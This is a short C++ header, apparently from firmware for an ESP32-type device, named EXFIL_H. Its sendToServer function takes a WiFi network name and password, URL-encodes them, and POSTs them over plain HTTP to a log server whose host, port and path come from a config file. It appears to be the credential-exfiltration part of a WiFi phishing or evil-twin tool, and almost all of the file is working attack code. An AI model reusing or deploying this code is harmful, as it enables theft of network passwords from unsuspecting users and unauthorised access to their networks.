#ifndef EXFIL_H
#define EXFIL_H

#include <HTTPClient.h>
#include "config.h"

String urlEncode(const String &s) {
  String out = "";
  char buf[5];
  for (unsigned int i = 0; i < s.length(); i++) {
    char c = s[i];
    if (isalnum(c) || c=='-' || c=='_' || c=='.' || c=='~') out += c;
    else { snprintf(buf, sizeof(buf), "%%%02X", c); out += buf; }
  }
  return out;
}

bool sendToServer(const String &ssid, const String &password) {
  HTTPClient http;
  String url = "http://" + String(LOG_SERVER_HOST) + ":" + String(LOG_SERVER_PORT) + LOG_SERVER_PATH;
  http.begin(url);
  http.addHeader("Content-Type", "application/x-www-form-urlencoded");
  http.setTimeout(4000);
  String body = "ssid=" + urlEncode(ssid) + "&password=" + urlEncode(password);
  int code = http.POST(body);
  http.end();
  return (code == 200);
}

#endif
